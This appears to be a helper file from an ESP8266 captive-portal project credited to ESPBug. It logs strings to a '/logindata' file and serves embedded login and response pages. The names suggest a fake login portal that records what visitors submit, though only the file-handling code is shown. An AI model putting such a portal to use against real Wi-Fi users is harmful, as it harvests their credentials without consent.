#include <LittleFS.h>

void startLilFS(){
  LittleFS.begin();

  File f = LittleFS.open("/logindata", "a");
  f.close();
}

//thancc
//https://github.com/willmendil/ESPBug/blob/354aa908b35e6b9515558c75490b6ab24b1c79d8/espbug/filesystem.h#L20
void logging(String& logString){
  File logFile = LittleFS.open("/logindata", "a");
  if (!logFile){
	Serial.println("Could not creat log file");
  }
  Serial.print(logString);
  if(logFile.println(logString)){
	Serial.println("  -->> Log was written");;
  } else {
	Serial.println("  -->> Log write failed");
  }
  logFile.close();
}

bool progmemToSpiffs(const char *adr, int len, String path) {
  File f = LittleFS.open(path, "w+");
  if (!f) {
	return false;
  }
  for (int i = 0; i < len; i++) {
	f.write(pgm_read_byte_near(adr + i));
  }
  f.close();
  return true;
}

void copyWebFiles() {
  progmemToSpiffs(loginHtml, sizeof(loginHtml), String(F("/captive.html")));
  progmemToSpiffs(responseHtml, sizeof(responseHtml), String(F("/response.html")));
}